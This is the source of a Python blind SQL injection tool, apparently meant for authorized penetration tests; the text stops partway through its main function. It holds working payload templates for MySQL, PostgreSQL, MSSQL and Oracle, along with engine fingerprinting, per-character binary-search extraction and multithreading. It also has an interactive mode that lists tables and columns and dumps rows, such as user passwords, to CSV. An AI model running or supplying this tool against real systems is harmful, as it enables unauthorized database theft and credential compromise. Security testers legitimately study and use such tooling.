#!/usr/bin/env python3
"""
blind_sqli_extract.py — Blind SQL injection data extractor for authorized pentests.

Boolean/time/error/auto oracles, per-character binary search, auto-detection of
injection context and backend DBMS, table dumping, and an interactive mode.

AUTHORIZED USE ONLY — only test systems you own or have explicit written
permission to test.

Requires: requests  (pip install requests)
Full usage and examples: see README.md, or run with --help.
"""

import argparse
import concurrent.futures
import csv
import sys
import threading
import time

import requests

CHARSET_LOW = 32    # space
CHARSET_HIGH = 126  # '~'

# Named charsets for --charset. Narrowing the search space cuts the number of
# requests per character (binary search steps = ceil(log2(len))). Huge for time
# mode: 'full' -> 7 steps, 'loweralnum' -> 6, 'hex' -> 4.
import string as _string
CHARSETS = {
    "full": list(range(32, 127)),
    "printable": list(range(32, 127)),
    "alnum": sorted(ord(c) for c in _string.ascii_letters + _string.digits),
    "loweralnum": sorted(ord(c) for c in _string.ascii_lowercase + _string.digits),
    "lower": [ord(c) for c in _string.ascii_lowercase],
    "upper": [ord(c) for c in _string.ascii_uppercase],
    "digits": [ord(c) for c in _string.digits],
    "hex": sorted(ord(c) for c in "0123456789abcdef"),
}

# Each worker thread gets its own requests.Session (thread-safe extraction).
_tls = threading.local()


def get_session(args):
    s = getattr(_tls, "session", None)
    if s is None:
        s = requests.Session()
        if args.proxy:
            s.proxies = {"http": args.proxy, "https": args.proxy}
        s.verify = not args.insecure
        _tls.session = s
    return s


# --------------------------------------------------------------------------- #
# Payload
# --------------------------------------------------------------------------- #
# Per-engine syntax. {cond} is a boolean SQL condition, {d} an integer of
# seconds, {esc} the literal-escape for the injection context ("'" for a
# single-quoted string, "" for a numeric context). Boolean templates just AND
# the condition; time templates make a TRUE condition cause a measurable delay.
DBMS = {
    "mysql": {
        "substr": "SUBSTRING", "length": "LENGTH",
        "bool": "{esc} AND {cond}-- -",
        "time": "{esc} AND IF({cond},SLEEP({d}),0)-- -",
        # EXP overflow when TRUE (710*1 overflows a double); FALSE -> EXP(0)=1.
        "error": "{esc} AND EXP(710*({cond}))-- -",
    },
    "postgres": {
        "substr": "SUBSTRING", "length": "LENGTH",
        "bool": "{esc} AND {cond}-- -",
        # Stacked query with a CASE + pg_sleep (PortSwigger time-delay lab).
        "time": "{esc}%3BSELECT CASE WHEN {cond} THEN pg_sleep({d}) "
                "ELSE pg_sleep(0) END-- -",
        # Division by zero when TRUE.
        "error": "{esc} AND 1=(SELECT 1/(CASE WHEN ({cond}) THEN 0 ELSE 1 END))-- -",
    },
    "mssql": {
        "substr": "SUBSTRING", "length": "LEN",
        "bool": "{esc} AND {cond}-- -",
        "time": "{esc}%3BIF({cond}) WAITFOR DELAY '0:0:{d}'-- -",
        "error": "{esc} AND 1=1/(CASE WHEN ({cond}) THEN 0 ELSE 1 END)-- -",
    },
    "oracle": {
        "substr": "SUBSTR", "length": "LENGTH",
        "bool": "{esc} AND {cond}-- -",
        "time": "{esc} AND (SELECT CASE WHEN {cond} THEN "
                "to_char(dbms_pipe.receive_message(('a'),{d})) ELSE NULL END "
                "FROM dual) IS NULL-- -",
        "error": "{esc} AND 1=(SELECT 1/(CASE WHEN ({cond}) THEN 0 ELSE 1 END) "
                 "FROM dual)-- -",
    },
}

# Unconditional, engine-specific delay — only the correct engine actually
# sleeps; wrong-engine syntax errors out (no delay). Content-independent, so it
# works even when there is no true/false content difference at all.
TIME_FINGERPRINT = {
    "mysql": "{esc} AND SLEEP({d})-- -",
    "postgres": "{esc}%3BSELECT pg_sleep({d})-- -",
    "mssql": "{esc}%3BWAITFOR DELAY '0:0:{d}'-- -",
    "oracle": "{esc} AND (SELECT dbms_pipe.receive_message(('a'),{d}) "
              "FROM dual) IS NOT NULL-- -",
}

# Candidate escapes to probe during context auto-detection.
CONTEXTS = [("string", "'"), ("numeric", ""), ("double-quote", '"')]


# Row pagination — appended to a query to fetch exactly one row at offset i.
PAGE = {
    "mysql": "LIMIT 1 OFFSET {i}",
    "postgres": "LIMIT 1 OFFSET {i}",
    "mssql": "ORDER BY 1 OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
    "oracle": "OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
}

# Where column metadata lives, per engine.
COLUMNS_QUERY = {
    "mysql": "SELECT column_name FROM information_schema.columns "
             "WHERE table_name='{t}'",
    "postgres": "SELECT column_name FROM information_schema.columns "
                "WHERE table_name='{t}'",
    "mssql": "SELECT column_name FROM information_schema.columns "
             "WHERE table_name='{t}'",
    "oracle": "SELECT column_name FROM all_tab_columns "
              "WHERE table_name='{t}'",
}

# Table listing (current schema/db), per engine.
TABLES_QUERY = {
    "mysql": "SELECT table_name FROM information_schema.tables "
             "WHERE table_schema=database()",
    "postgres": "SELECT table_name FROM information_schema.tables "
                "WHERE table_schema='public'",
    "mssql": "SELECT table_name FROM information_schema.tables",
    "oracle": "SELECT table_name FROM user_tables",
}

# Current database name, per engine.
DBNAME_QUERY = {
    "mysql": "SELECT database()",
    "postgres": "SELECT current_database()",
    "mssql": "SELECT DB_NAME()",
    "oracle": "SELECT sys_context('userenv','current_schema') FROM dual",
}

# Version banner, per engine.
VERSION_QUERY = {
    "mysql": "SELECT version()",
    "postgres": "SELECT version()",
    "mssql": "SELECT @@version",
    "oracle": "SELECT banner FROM v$version WHERE ROWNUM=1",
}

# A condition that is always TRUE *and* only parses on the matching engine
# (uses a function/pseudo-column unique to that engine). Wrong engine -> SQL
# error -> oracle reads FALSE, so the one that comes back TRUE is the backend.
FINGERPRINT = {
    "mysql": "CONNECTION_ID()=CONNECTION_ID()",   # MySQL-only function
    "postgres": "1=(SELECT 1 FROM pg_class LIMIT 1)",  # pg_class catalog
    "mssql": "@@SERVERNAME=@@SERVERNAME",          # MSSQL global var
    "oracle": "ROWNUM=ROWNUM",                     # Oracle pseudo-column
}


def cast_col(dbms, col):
    """Wrap a column so NULLs become '' and non-text casts to text safely."""
    if dbms == "mysql":
        return f"COALESCE(CAST({col} AS CHAR),'')"
    if dbms == "mssql":
        return f"COALESCE(CAST({col} AS VARCHAR(4000)),'')"
    if dbms == "oracle":
        return f"COALESCE(CAST({col} AS VARCHAR2(4000)),'')"
    return f"COALESCE(CAST({col} AS text),'')"  # postgres


def build_concat(dbms, cols, sep):
    """Concatenate several columns into one string with `sep` between them."""
    if dbms == "mysql":
        inner = ",".join(cast_col(dbms, c) for c in cols)
        return f"CONCAT_WS('{sep}',{inner})"
    op = "+" if dbms == "mssql" else "||"          # mssql uses +, others ||
    parts = []
    for i, c in enumerate(cols):
        if i:
            parts.append(f"'{sep}'")
        parts.append(cast_col(dbms, c))
    return f" {op} ".join(parts)


def wrap(args, cond):
    """Wrap an arbitrary SQL condition into a payload for the chosen dbms/mode."""
    cfg = DBMS[args.dbms]
    esc = getattr(args, "esc", "'")
    if args.mode == "boolean":
        return cfg["bool"].format(cond=cond, esc=esc)
    if args.mode == "error":
        return cfg["error"].format(cond=cond, esc=esc)
    return cfg["time"].format(cond=cond, d=int(round(args.delay)), esc=esc)


def char_cond(args, position, guess, cmp_op, query):
    cfg = DBMS[args.dbms]
    return (f"ASCII({cfg['substr']}(({query}),{position},1))"
            f"{cmp_op}{guess}")


def len_cond(args, guess, cmp_op, query):
    cfg = DBMS[args.dbms]
    return f"{cfg['length']}(({query})){cmp_op}{guess}"


def build_payload(args, position, guess, cmp_op, query):
    return wrap(args, char_cond(args, position, guess, cmp_op, query))


# --------------------------------------------------------------------------- #
# Raw request (Burp/ZAP) parsing
# --------------------------------------------------------------------------- #
def load_raw_request(path):
    """Read a raw HTTP request file into its text (kept as a template)."""
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        raw = fh.read()
    # Normalise line endings; HTTP wants CRLF but we split on \n internally.
    return raw.replace("\r\n", "\n")


def parse_raw_request(raw, https):
    """
    Turn a raw HTTP request into (method, url, headers, body).
    Cookies are left inside the Cookie header (requests sends them fine).
    Scheme is not present in a raw request, so it comes from --https.
    """
    if "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""

    lines = head.split("\n")
    request_line = lines[0].strip()
    parts = request_line.split()
    if len(parts) < 2:
        raise SystemExit(f"[!] Malformed request line: {request_line!r}")
    method, target = parts[0], parts[1]

    headers = {}
    host = None
    for line in lines[1:]:
        if not line.strip():
            continue
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        if k.lower() == "host":
            host = v
        # Let requests set these itself to avoid mismatches.
        if k.lower() in ("content-length",):
            continue
        headers[k] = v

    if target.lower().startswith("http://") or target.lower().startswith("https://"):
        url = target
    else:
        if not host:
            raise SystemExit("[!] No Host header found and path is relative; "
                             "cannot build URL")
        scheme = "https" if https else "http"
        url = f"{scheme}://{host}{target}"

    body = body.rstrip("\n")
    return method, url, headers, body


# --------------------------------------------------------------------------- #
# Flag-built request helpers
# --------------------------------------------------------------------------- #
def parse_cookies(raw):
    jar = {}
    for part in (raw or "").split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            jar[k.strip()] = v.strip()
    return jar


def parse_headers(pairs):
    hdrs = {}
    for item in pairs or []:
        if ":" in item:
            k, v = item.split(":", 1)
            hdrs[k.strip()] = v.strip()
    return hdrs


# --------------------------------------------------------------------------- #
# Sending
# --------------------------------------------------------------------------- #
def send(args, injection):
    """Place the payload, send one request, return (response, elapsed)."""
    session = get_session(args)
    payload = args.prefix + injection + args.suffix

    if args.req_raw is not None:
        # Substitute the marker in the raw request text, then parse & send.
        if args.marker_token not in args.req_raw:
            raise SystemExit(f"[!] The request file has no {args.marker_token!r} "
                             f"token marking the injection point")
        raw = args.req_raw.replace(args.marker_token, payload)
        method, url, headers, body = parse_raw_request(raw, args.https)
        t0 = time.time()
        r = session.request(method, url, headers=headers or None,
                            data=body.encode() if body else None,
                            timeout=args.timeout, allow_redirects=False)
        return r, time.time() - t0

    # --- flag-built path ---
    params = data = None
    headers = dict(args._base_headers)
    cookies = dict(args._base_cookies)
    where = args.where

    if where == "param":
        if args.method.upper() == "POST":
            data = {args.param: payload}
        else:
            params = {args.param: payload}
    elif where == "cookie":
        cookies[args.param] = payload
    elif where == "header":
        headers[args.param] = payload
    elif where == "body":
        if args.marker_token not in args.body:
            raise SystemExit(f"[!] --body must contain {args.marker_token!r}")
        data = args.body.replace(args.marker_token, payload)
        if args.content_type:
            headers["Content-Type"] = args.content_type

    t0 = time.time()
    r = session.request(args.method.upper(), args.url,
                        params=params, data=data,
                        headers=headers or None, cookies=cookies or None,
                        timeout=args.timeout, allow_redirects=False)
    return r, time.time() - t0


def _send_retry(args, injection, _retries=2):
    """Send with a small retry on transient network errors."""
    for attempt in range(_retries + 1):
        try:
            return send(args, injection)
        except requests.RequestException:
            if attempt == _retries:
                raise
            time.sleep(0.5 * (attempt + 1))


def is_true(args, injection):
    """Evaluate the calibrated oracle on one response. In time mode a positive
    result is re-checked --confirm times to filter out network-jitter flukes."""
    r, elapsed = _send_retry(args, injection)
    res = args._oracle(r, elapsed)
    if res and args.mode == "time" and getattr(args, "confirm", 0) > 0:
        for _ in range(args.confirm):
            r2, e2 = _send_retry(args, injection)
            if not args._oracle(r2, e2):
                return False   # a re-check disagreed -> treat as FALSE
    return res


def derive_oracle(args, r_true, e_true, r_false, e_false):
    """Given the responses to a TRUE and a FALSE condition, return
    (oracle_fn, description). oracle_fn(resp, elapsed) -> bool."""
    # Time mode: purely timing.
    if args.mode == "time":
        thresh = args.delay * 0.8
        return (lambda r, e: e >= thresh), f"time >= {thresh:.1f}s"

    # Explicit marker wins.
    if args.true_marker:
        m = args.true_marker
        return (lambda r, e: m in r.text), f"marker {m!r}"

    # Auto-derive a content discriminator from the two responses.
    if r_true.status_code != r_false.status_code:
        code = r_true.status_code
        return (lambda r, e: r.status_code == code),\
               f"status == {code} (FALSE={r_false.status_code})"

    lt, lf = len(r_true.text), len(r_false.text)
    if lt != lf:
        return (lambda r, e: abs(len(r.text) - lt) <= abs(len(r.text) - lf)),\
               f"response length ~{lt} (FALSE ~{lf})"

    # Last resort: a distinctive line present in TRUE but not FALSE.
    tset, fset = set(r_true.text.splitlines()), set(r_false.text.splitlines())
    uniq = [ln.strip() for ln in (tset - fset) if ln.strip()]
    if uniq:
        token = max(uniq, key=len)[:60]
        return (lambda r, e: token in r.text), f"auto-marker {token!r}"

    raise SystemExit(
        "[!] TRUE and FALSE responses are identical (same status, length, and "
        "body). No boolean/error oracle available — use --mode time.")


def calibrate(args):
    """Send a TRUE and FALSE condition, build the oracle, and verify it."""
    r_t, e_t = _send_retry(args, wrap(args, "1=1"))
    r_f, e_f = _send_retry(args, wrap(args, "1=2"))
    args._oracle, desc = derive_oracle(args, r_t, e_t, r_f, e_f)
    t = args._oracle(r_t, e_t)
    f = args._oracle(r_f, e_f)
    print(f"[*] Oracle: {desc}")
    print(f"[*] Calibration: TRUE->{t}  FALSE->{f}")
    if not (t and not f):
        raise SystemExit("[!] Oracle failed calibration. Check prefix/suffix, "
                         "quoting, encoding, --mode, or --delay.")
    print("[*] Oracle OK.\n")


def find_length(args, query):
    """Binary-search the length of the value (0..--max-len)."""
    lo, hi = 0, args.max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(args, wrap(args, len_cond(args, mid, ">", query))):
            lo = mid + 1
        else:
            hi = mid
    return lo


def find_char(args, position, query):
    """Binary-search the character at `position` over the active charset."""
    cs = args._charset                       # sorted list of ASCII codes
    if not is_true(args, build_payload(args, position, cs[0] - 1, ">", query)):
        return None  # no character here (past end of string)
    lo, hi = 0, len(cs) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(args, build_payload(args, position, cs[mid], ">", query)):
            lo = mid + 1
        else:
            hi = mid
    return chr(cs[lo])


def _extract_chars(args, query, length, on_progress=None, workers=None):
    """Extract `length` characters of `query` in parallel; returns the string."""
    total = min(length, args.max_len)
    chars = {}
    workers = max(1, workers if workers is not None else args.threads)
    if workers == 1:
        for pos in range(1, total + 1):
            chars[pos] = find_char(args, pos, query)
            if on_progress:
                on_progress(chars)
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(find_char, args, pos, query): pos
                    for pos in range(1, total + 1)}
            for fut in concurrent.futures.as_completed(futs):
                chars[futs[fut]] = fut.result()
                if on_progress:
                    on_progress(chars)
    out = []
    for p in range(1, total + 1):
        if chars.get(p) is None:
            break
        out.append(chars[p])
    return "".join(out)


def extract_value(args, query, workers=None):
    """Length + char extraction, no live output. Returns the string.
    `workers` overrides thread count (use 1 when the caller parallelizes rows)."""
    length = find_length(args, query)
    if length == 0:
        return ""
    return _extract_chars(args, query, length, workers=workers)


def extract_scalar(args, label=""):
    """Extract args.query with a live per-character readout (single value)."""
    length = find_length(args, args.query)
    if length == 0:
        return ""
    total = min(length, args.max_len)
    start = time.time()

    def render(chars):
        line = "".join(chars.get(p, "·") for p in range(1, total + 1))
        sys.stdout.write(f"\r{label}[{len(chars):>2}/{total}] {line}   "
                         f"({time.time() - start:5.1f}s)")
        sys.stdout.flush()

    val = _extract_chars(args, args.query, length, on_progress=render)
    print()
    return val


# --------------------------------------------------------------------------- #
# Auto detection + interactive enumeration
# --------------------------------------------------------------------------- #
def _probe_oracle(args):
    """Send TRUE (1=1) and FALSE (1=2) with the current mode/dbms/esc and try to
    build a discriminating oracle. Returns (oracle, desc) or None."""
    try:
        r_t, e_t = _send_retry(args, wrap(args, "1=1"))
        r_f, e_f = _send_retry(args, wrap(args, "1=2"))
        oracle, desc = derive_oracle(args, r_t, e_t, r_f, e_f)
        if oracle(r_t, e_t) and not oracle(r_f, e_f):
            return oracle, desc
    except (SystemExit, requests.RequestException):
        pass
    return None


def resolve_auto(args):
    """--mode auto: fully resolve mode + DBMS + context + oracle by probing the
    target. Tries boolean (content) -> error (per engine) -> time. On success
    everything needed for extraction is set and args._resolved is True."""
    print("[*] Auto-detecting: mode + context + DBMS ...")
    escapes = CONTEXTS if args.context == "auto" else [("set", args.esc)]
    saved_dbms = args.dbms

    # 1. Boolean / content oracle (engine-independent break-out).
    args.mode = "boolean"
    for name, esc in escapes:
        args.esc = esc
        res = _probe_oracle(args)
        print(f"      boolean (esc={esc!r}) -> {'yes' if res else 'no'}")
        if res:
            args._oracle, desc = res
            # Boolean is engine-independent, so fingerprint the DBMS now
            # (needed for correct enumeration queries).
            engine = detect_dbms(args)
            args.dbms = engine or saved_dbms
            args._resolved = True
            print(f"[+] Mode: boolean   DBMS: {args.dbms}"
                  f"{'' if engine else ' (fingerprint failed, assumed)'}   "
                  f"Context: {name} (esc={esc!r})   Oracle: {desc}\n")
            return

    # 2. Error-based oracle: TRUE triggers a DB error. Engine-specific, so this
    #    identifies the backend and the context in one shot.
    args.mode = "error"
    for engine in ("oracle", "postgres", "mssql", "mysql"):
        args.dbms = engine
        for name, esc in escapes:
            args.esc = esc
            res = _probe_oracle(args)
            if res:
                args._oracle, desc = res
                args._resolved = True
                print(f"      error ({engine}, esc={esc!r}) -> yes")
                print(f"[+] Mode: error   DBMS: {engine}   "
                      f"Context: {name} (esc={esc!r})   Oracle: {desc}\n")
                return
    print("      error -> no match on any engine")

    # 3. Time: fingerprint engine + context together via a confirmed delay.
    args.dbms = saved_dbms
    args.mode = "time"
    print("[*] Trying time-based detection...")
    for name, esc in escapes:
        for engine, tmpl in TIME_FINGERPRINT.items():
            payload = tmpl.format(d=int(round(args.delay)), esc=esc)
            if timed_hit(args, payload):
                args.dbms = engine
                args.esc = esc
                thresh = args.delay * 0.8
                args._oracle = (lambda r, e: e >= thresh)
                args._resolved = True
                print(f"      (time mode is slow; --confirm re-checks positives. "
                      f"Tip: --charset loweralnum/hex if you know the format)")
                print(f"[+] Mode: time   DBMS: {engine}   "
                      f"Context: {name} (esc={esc!r})   Oracle: time >= "
                      f"{thresh:.1f}s\n")
                return

    raise SystemExit(
        "[!] Auto-detection found no working oracle (boolean / error / time).\n"
        "    The parameter may not be injectable, or needs a custom escape.\n"
        "    Try: a larger --delay, or set --mode/--dbms/--context/--prefix "
        "manually.")


def detect_context(args):
    """Boolean-mode context detection (engine-independent). Tries each escape,
    keeps the one where a TRUE vs FALSE condition produces a working oracle.
    Sets args.esc and args._oracle. Returns the escape, or None."""
    print("[*] Detecting injection context...")
    for name, esc in CONTEXTS:
        args.esc = esc
        try:
            r_t, e_t = _send_retry(args, wrap(args, "1=1"))
            r_f, e_f = _send_retry(args, wrap(args, "1=2"))
            oracle, desc = derive_oracle(args, r_t, e_t, r_f, e_f)
            ok = oracle(r_t, e_t) and not oracle(r_f, e_f)
        except (SystemExit, requests.RequestException):
            ok = False
        print(f"      {name:<12} (esc={esc!r}) -> {'MATCH' if ok else 'no'}")
        if ok:
            args._oracle = oracle
            print(f"[+] Context: {name}  escape={esc!r}   Oracle: {desc}\n")
            return esc
    return None


def timed_hit(args, payload):
    """True only if the payload reliably delays: the first response must exceed
    the threshold AND a re-check must too (rejects one-off slow responses that
    would otherwise cause a false fingerprint match)."""
    thresh = args.delay * 0.8
    try:
        _, e = _send_retry(args, payload)
        if e < thresh:
            return False
        for _ in range(max(1, getattr(args, "confirm", 1))):
            _, e2 = _send_retry(args, payload)
            if e2 < thresh:
                return False   # didn't delay on re-check -> false positive
    except requests.RequestException:
        return False
    return True


def detect_context_time(args):
    """Time-mode context detection for a KNOWN engine (non-interactive path):
    try each escape with args.dbms's unconditional sleep; keep the one that
    delays. Sets args.esc. Returns the escape, or None."""
    for name, esc in CONTEXTS:
        payload = TIME_FINGERPRINT[args.dbms].format(
            d=int(round(args.delay)), esc=esc)
        ok = timed_hit(args, payload)
        print(f"      {name:<12} (esc={esc!r}) -> {'MATCH (delayed)' if ok else 'no'}")
        if ok:
            args.esc = esc
            return esc
    return None


def detect_dbms(args):
    """Fingerprint the backend engine.

    boolean mode: use each engine's unique always-true function (fast, needs a
    working content oracle — already calibrated).
    time / error mode: use an unconditional engine-specific SLEEP; only the
    correct engine delays. Content-independent, so it works with no marker."""
    print("[*] Fingerprinting DBMS...")

    if args.mode == "boolean":
        esc = getattr(args, "esc", "'")
        for engine, sig in FINGERPRINT.items():
            try:
                hit = is_true(args, f"{esc} AND {sig}-- -")
            except requests.RequestException:
                hit = False
            print(f"      {engine:<9} -> {'MATCH' if hit else 'no'}")
            if hit:
                return engine
        return None

    # time / error -> timing fingerprint. If context is unknown (esc is None),
    # try each escape here too, so context + engine are found together. Each hit
    # is confirmed (timed_hit) to reject one-off slow responses.
    if getattr(args, "esc", "'") is None:
        esc_candidates = CONTEXTS
    else:
        esc_candidates = [("set", args.esc)]
    for _cname, esc in esc_candidates:
        for engine, tmpl in TIME_FINGERPRINT.items():
            payload = tmpl.format(d=int(round(args.delay)), esc=esc)
            hit = timed_hit(args, payload)
            tag = f"{engine} (esc={esc!r})"
            print(f"      {tag:<24} -> {'MATCH (delayed)' if hit else 'no'}")
            if hit:
                args.esc = esc
                return engine
    return None


def extract_query(args, query, label=""):
    """Extract one scalar for an ad-hoc query without clobbering args.query."""
    saved = args.query
    args.query = query
    try:
        return extract_scalar(args, label=label)
    finally:
        args.query = saved


def ask(prompt, default=None):
    """Prompt the user; fall back to default if input isn't available."""
    try:
        ans = input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return ans or default


def run_auto(args):
    """Interactive, guided detect -> enumerate -> dump workflow."""
    # If --mode auto already resolved everything, reuse it and skip re-detection.
    if getattr(args, "_resolved", False):
        engine = args.dbms
        print(f"[*] Resolved: mode={args.mode}, dbms={engine}, "
              f"context esc={args.esc!r}\n")
    else:
        # Explicit --mode with --auto. Boolean: build content oracle then
        # fingerprint. Time/error: fingerprint by timing, then calibrate.
        if args.mode == "boolean":
            calibrate(args)
        engine = detect_dbms(args)
        if not engine:
            raise SystemExit("[!] Could not fingerprint the DBMS. It may be a "
                             "less common engine, or the context needs a custom "
                             "--prefix/--suffix. Try setting --dbms manually.")
        args.dbms = engine
        print(f"\n[+] DBMS detected: {engine}\n")
        if args.mode != "boolean":
            calibrate(args)

    # 3. Version + current DB — only with --info (these strings are long and
    #    slow to extract, especially in time mode; skipped by default).
    if args.info:
        ver = extract_query(args, VERSION_QUERY[engine], label="version: ")
        db = extract_query(args, DBNAME_QUERY[engine], label="database: ")
        print(f"\n[+] Version : {ver}")
        print(f"[+] Database: {db}\n")

    # 4. List tables
    print("[*] Listing tables...\n")
    tables = collect_rows(args, TABLES_QUERY[engine], 200)
    if not tables:
        raise SystemExit("[!] No tables found.")
    print("\n[+] Tables:")
    for i, t in enumerate(tables):
        print(f"    [{i}] {t}")

    # 5. Loop: pick a table, pick columns, dump
    while True:
        sel = ask("\n> Pick a table (number, name, or 'q' to quit): ", "q")
        if sel in ("q", "quit", "exit", None):
            print("[*] Done.")
            return
        if sel.isdigit() and int(sel) < len(tables):
            table = tables[int(sel)]
        elif sel in tables:
            table = sel
        else:
            print("[!] Not a valid choice.")
            continue

        print(f"\n[*] Columns of '{table}':\n")
        cols = collect_rows(args, COLUMNS_QUERY[engine].format(t=table), 100)
        if not cols:
            print("[!] No columns found for that table.")
            continue
        print("\n[+] Columns:")
        for i, c in enumerate(cols):
            print(f"    [{i}] {c}")

        pick = ask("\n> Dump which columns? ('all', or comma numbers/names): ",
                   "all")
        if pick and pick.lower() != "all":
            chosen = []
            for tok in pick.split(","):
                tok = tok.strip()
                if tok.isdigit() and int(tok) < len(cols):
                    chosen.append(cols[int(tok)])
                elif tok in cols:
                    chosen.append(tok)
            cols_to_dump = chosen or cols
        else:
            cols_to_dump = cols

        cap = ask("> Max rows to dump [50]: ", "50")
        cap = int(cap) if cap and cap.isdigit() else 50

        concat = build_concat(engine, cols_to_dump, args.sep)
        print(f"\n[*] Dumping {', '.join(cols_to_dump)} from '{table}'...\n")
        values = collect_rows(args, f"SELECT {concat} FROM {table}", cap)

        print(f"\n[+] {len(values)} row(s) from '{table}':")
        print("    " + " | ".join(cols_to_dump))
        for v in values:
            print("    " + v)

        out = ask("\n> Save to CSV? (filename, or Enter to skip): ", "")
        if out:
            rows = [cols_to_dump] + [v.split(args.sep) for v in values]
            with open(out, "w", newline="", encoding="utf-8") as fh:
                csv.writer(fh).writerows(rows)
            print(f"[+] Wrote {len(rows)} row(s) to {out}")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main():
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)

    # Request source (choose one)
    p.add_argument("--req",
                   help="Raw HTTP request file from Burp/ZAP; mark injection "
                        "point with the --marker-token (*INJECT*)")
    p.add_argument("--https", action="store_true",
                   help="Use HTTPS for --req (raw requests carry no scheme)")

    p.add_argument("--url", help="Target URL (flag-built mode)")
    p.add_argument("--where", default="param",
                   choices=["param", "cookie", "header", "body"])
    p.add_argument("--param", help="Name of param/cookie/header to inject")
    p.add_argument("--method", default="GET")

    # Extraction
    p.add_argument("--query",
                   help="Sub-query to extract, e.g. "
                        "\"SELECT password FROM users WHERE username='admin'\" "
                        "(not needed with --auto)")
    p.add_argument("--mode", default=None,
                   choices=["boolean", "time", "error", "auto"],
                   help="Oracle type: boolean (content differs), time (SLEEP), "
                        "error (TRUE triggers a SQL error), or auto (try "
                        "boolean -> error -> time). Default: auto with --auto, "
                        "else boolean")
    p.add_argument("--dbms", default="mysql",
                   choices=["mysql", "postgres", "mssql", "oracle"],
                   help="Backend DB — picks SLEEP/SUBSTRING/comment syntax")
    p.add_argument("--true-marker",
                   help="Substring present when TRUE. Optional: if omitted in "
                        "boolean/error mode, an oracle is auto-derived from the "
                        "status code or response length")
    p.add_argument("--delay", type=float, default=3.0,
                   help="Seconds a TRUE condition should sleep (time mode)")
    p.add_argument("--context", default=None,
                   choices=["string", "numeric", "double", "auto"],
                   help="Injection context / literal escape: string ('), "
                        "numeric (none), double (\"), or auto to detect it. "
                        "Default: auto with --auto, else string")
    p.add_argument("--confirm", type=int, default=1,
                   help="Time mode only: re-check a positive result N times to "
                        "reject network-jitter false positives (default 1)")
    p.add_argument("--prefix", default="")
    p.add_argument("--suffix", default="")
    p.add_argument("--max-len", type=int, default=64)
    p.add_argument("--rows", type=int, default=0,
                   help="Enumerate multiple rows: extract up to N rows of the "
                        "query via LIMIT/OFFSET, stopping when a row is empty")
    p.add_argument("--auto", action="store_true",
                   help="Interactive mode: auto-detect the DBMS, then walk "
                        "through tables -> columns -> dump, prompting at each step")
    p.add_argument("--dump", metavar="TABLE",
                   help="Auto-dump a table: discover its columns, then extract "
                        "all rows (uses --rows as the row cap, default 50)")
    p.add_argument("--sep", default="~",
                   help="Separator between concatenated columns (default '~')")
    p.add_argument("--threads", type=int, default=10,
                   help="Parallel workers for character/row search (default 10)")
    p.add_argument("--charset", default="full", choices=list(CHARSETS.keys()),
                   help="Restrict the character set to speed up extraction: "
                        "full (default), loweralnum, alnum, lower, upper, "
                        "digits, hex. Fewer chars = fewer requests/char.")
    p.add_argument("--info", action="store_true",
                   help="In --auto, also extract DB version + name (slow, off "
                        "by default — skips straight to tables)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy",
                   help="Proxy URL, e.g. http://127.0.0.1:8080 (route via Burp)")
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS verification (needed with an intercepting proxy)")
    p.add_argument("--output", metavar="FILE.csv",
                   help="Write extracted value(s) to a CSV file")
    p.add_argument("--no-calibrate", action="store_true",
                   help="Skip the TRUE/FALSE oracle sanity check")

    # Flag-built extras
    p.add_argument("--body", default="")
    p.add_argument("--marker-token", default="*INJECT*")
    p.add_argument("--content-type")
    p.add_argument("--base-cookies")
    p.add_argument("--header", action="append", default=[])

    args = p.parse_args()

    # Validate mode selection
    if args.req:
        args.req_raw = load_raw_request(args.req)
    else:
        args.req_raw = None
        if not args.url:
            p.error("provide either --req FILE or --url ...")
        if args.where in ("param", "cookie", "header") and not args.param:
            p.error(f"--param is required for --where {args.where}")
        if args.where == "body" and not args.body:
            p.error("--body is required for --where body")

    if not args.auto and not args.query:
        p.error("--query is required (unless using --auto)")
    if not args.query:
        args.query = ""  # placeholder; --auto sets it per step

    args._base_cookies = parse_cookies(args.base_cookies)
    args._base_headers = {"User-Agent": "authorized-pentest/1.0"}
    args._base_headers.update(parse_headers(args.header))

    # --auto means "figure everything out": default mode and context to auto.
    if args.mode is None:
        args.mode = "auto" if args.auto else "boolean"
    if args.context is None:
        args.context = "auto" if args.auto else "string"

    args._oracle = None
    args._resolved = False
    # Active charset for extraction. Always include the column separator so a
    # restricted charset (e.g. loweralnum) can't corrupt dumped rows.
    _cs = set(CHARSETS[args.charset]) | {ord(c) for c in (args.sep or "")}
    args._charset = sorted(_cs)
    _ESC_MAP = {"string": "'", "numeric": "", "double": '"'}
    args.esc = None if args.context == "auto" else _ESC_MAP[args.context]

    if args.insecure:
        try:
            requests.packages.urllib3.disable_warnings()
        except Exception:
            pass
    if args.mode == "time" and args.threads > 1:
        print("[*] time mode: --confirm re-checks positive results, so threading "
              "is used for speed. If you see garbled chars, lower --threads or "
              "raise --confirm/--delay.\n")

    src = f"req file {args.req}" if args.req else f"{args.method.upper()} {args.url}"
    print(f"[*] Source : {src}")
    if not args.req:
        print(f"[*] Inject : {args.where}"
              + (f" '{args.param}'" if args.param else ""))
    dbms_label = "auto-detect" if args.auto else args.dbms
    print(f"[*] Mode   : {args.mode} ({dbms_label})   Threads: {args.threads}")
    if args.proxy:
        print(f"[*] Proxy  : {args.proxy}")
    if args.query:
        print(f"[*] Query  : {args.query}")
    print()

    # Auto-resolve mode + context + dbms + oracle first (may set all of them).
    if args.mode == "auto":
        resolve_auto(args)

    # Resolve injection context when still needed.
    if args.context == "auto" and args._oracle is None:
        if args.mode == "boolean":
            if detect_context(args) is None:
